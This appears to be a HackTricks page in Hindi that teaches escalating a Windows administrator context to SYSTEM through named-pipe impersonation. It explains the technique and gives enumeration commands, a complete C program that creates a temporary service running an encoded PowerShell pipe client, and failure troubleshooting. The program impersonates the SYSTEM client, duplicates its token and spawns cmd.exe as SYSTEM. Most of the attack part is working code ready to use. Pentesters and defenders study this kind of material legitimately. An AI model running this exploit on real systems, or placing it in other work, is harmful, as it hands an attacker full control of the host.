# High Integrity से SYSTEM तक Name Pipes के साथ

{{#include ../../banners/hacktricks-training.md}}

यह named-pipe impersonation का **administrator/SCM variant** है: एक elevated process एक temporary service बनाता है, जिसका child `SYSTEM` के रूप में connect करता है और फिर उस client को impersonate करता है। यदि शुरुआती context services create नहीं कर सकता, लेकिन उसके पास `SeImpersonatePrivilege` है, तो इसके बजाय privileged-service coercion का उपयोग करें; [Named Pipe Client Impersonation](named-pipe-client-impersonation.md) और [RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato](roguepotato-and-printspoofer.md) देखें। Service बनाने के लिए SCM तक access और नई service पर `SERVICE_START` access आवश्यक है, जबकि `CreateProcessWithTokenW` के लिए `SeImpersonatePrivilege` आवश्यक है।<sup>[[2]](#references)[[3]](#references)</sup>

अपेक्षित शुरुआती context की तुरंत पुष्टि करें:
```cmd
whoami /groups | findstr /i "High Mandatory"
whoami /priv | findstr /i "SeImpersonatePrivilege"
sc.exe query PiperSrv
```
**Code flow:**

1. Service शुरू करने से **पहले** named-pipe server बनाएं। प्रतीक्षा करते समय, `ConnectNamedPipe` के `FALSE` लौटाने और `ERROR_PIPE_CONNECTED` मिलने को success मानें: इसका अर्थ है कि client ने race जीतकर `CreateNamedPipe` और `ConnectNamedPipe` के बीच connection बना लिया।<sup>[[4]](#references)</sup>
2. ऐसी service बनाकर शुरू करें जो बनाए गए pipe से connect होकर कुछ लिखे। Service code इस encoded PS code को execute करेगा: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Service के connect होकर लिखने के बाद, `ImpersonateNamedPipeClient` call करें, प्राप्त thread token को open करें और उसे primary token के रूप में duplicate करें।<sup>[[1]](#references)</sup>
4. उस primary token का उपयोग करके `cmd.exe` spawn करें।<sup>[[2]](#references)</sup>

यह route मानता है कि caller service create/start कर सकता है और उसके पास `CreateProcessWithTokenW` के लिए आवश्यक privileges हैं (सामान्यतः `SeImpersonatePrivilege`)। यह high-integrity-to-SYSTEM technique है, किसी भी low-privileged user के लिए उपलब्ध primitive नहीं।<sup>[[2]](#references)[[3]](#references)</sup>

> [!WARNING]
> यदि service creation/start विफल हो जाता है, तो sample pipe thread को signal नहीं करता और अनिश्चित समय तक प्रतीक्षा कर सकता है। Lab के बाहर इसका उपयोग करने से पहले error handling और overlapped pipe timeout जोड़ें। Collisions से बचने के लिए random pipe/service name भी उपयोग करें।

`ImpersonateNamedPipeClient` **last message read** से जुड़े context को अपनाता है, इसलिए केवल connection पर्याप्त नहीं है: privileged client से लिखवाएं, सुनिश्चित करें कि `ReadFile` ने data लौटाया है, और उसके बाद ही impersonate करें। Thread impersonation token को `SecurityImpersonation` के साथ `TokenPrimary` token में duplicate करें; process-creation API primary token का ही उपयोग करती है।<sup>[[1]](#references)[[5]](#references)</sup>
```c
#include <windows.h>
#include <time.h>

#pragma comment (lib, "advapi32")
#pragma comment (lib, "kernel32")

#define PIPESRV "PiperSrv"
#define MESSAGE_SIZE 512

DWORD WINAPI ServiceGo(LPVOID lpParam) {

SC_HANDLE scManager;
SC_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);

if (scManager == NULL) {
return FALSE;
}

// create Piper service
scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
"C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==",
NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) {
//printf("[!] CreateServiceA() failed: [%d]\n", GetLastError());
return FALSE;
}

// launch it
StartService(scService, 0, NULL);

// wait a bit and then cleanup
Sleep(10000);
DeleteService(scService);

CloseServiceHandle(scService);
CloseServiceHandle(scManager);
}

int main() {

LPCSTR sPipeName = "\\\\.\\pipe\\piper";
HANDLE hSrvPipe;
HANDLE th;
BOOL bPipeConn;
char pPipeBuf[MESSAGE_SIZE];
DWORD dBRead = 0;

HANDLE hImpToken;
HANDLE hNewToken;
STARTUPINFOW si;
PROCESS_INFORMATION pi;

// open pipe
hSrvPipe = CreateNamedPipeA(sPipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_WAIT,
PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);

// create and run service
th = CreateThread(0, 0, ServiceGo, NULL, 0, 0);

// wait for the connection from the service
bPipeConn = ConnectNamedPipe(hSrvPipe, NULL);
if (!bPipeConn && GetLastError() == ERROR_PIPE_CONNECTED) {
bPipeConn = TRUE; // Client connected between CreateNamedPipe and ConnectNamedPipe
}
if (bPipeConn) {
if (!ReadFile(hSrvPipe, &pPipeBuf, MESSAGE_SIZE, &dBRead, NULL) || dBRead == 0) {
return -6;
}

// impersonate the service (SYSTEM)
if (ImpersonateNamedPipeClient(hSrvPipe) == 0) {
return -1;
}

// wait for the service to cleanup
WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hImpToken)) {
return -2;
}

// create new primary token for new process
if (!DuplicateTokenEx(hImpToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
TokenPrimary, &hNewToken)) {
return -4;
}

//Sleep(20000);
// spawn cmd.exe as full SYSTEM user
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL,
CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
return -5;
}

// revert back to original security context
RevertToSelf();

}

return 0;
}
```
### विफलता का विश्लेषण

- `ConnectNamedPipe == FALSE` के साथ `ERROR_PIPE_CONNECTED`: जारी रखें; pipe पहले से connected है।<sup>[[4]](#references)</sup>
- `ImpersonateNamedPipeClient` `ERROR_CANNOT_IMPERSONATE` (`1368`) के साथ विफल होता है: पुष्टि करें कि SYSTEM client ने वास्तव में data लिखा है और `ReadFile` पूरा हुआ है। Client के अनुरोधित impersonation level की भी जांच करें; identification/anonymous-level clients को पूरी तरह impersonate नहीं किया जा सकता।<sup>[[1]](#references)</sup>
- `CreateProcessWithTokenW` `ERROR_PRIVILEGE_NOT_HELD` (`1314`) के साथ विफल होता है: original caller के पास `SeImpersonatePrivilege` नहीं है। High-integrity administrator context से, [SeImpersonate from High To System](seimpersonate-from-high-to-system.md) में documented token-copy route का उपयोग करें, या आवश्यक privileges मौजूद होने पर SYSTEM को impersonate करते हुए `CreateProcessAsUserW` का उपयोग करें।<sup>[[2]](#references)</sup>
- `CreateServiceA` `ERROR_SERVICE_EXISTS` (`1073`) लौटाता है: पुराने `PiperSrv` entry को delete करें या `PIPESRV` को randomize करें; trigger के बाद temporary service को हमेशा delete करें।<sup>[[3]](#references)</sup>



## References

- [1] [Microsoft Learn — `ImpersonateNamedPipeClient`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [Microsoft Learn — `CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [3] [Microsoft Learn — `CreateServiceA`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
- [4] [Microsoft Learn — `ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
- [5] [Microsoft Learn — `DuplicateTokenEx`](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex)
{{#include ../../banners/hacktricks-training.md}}
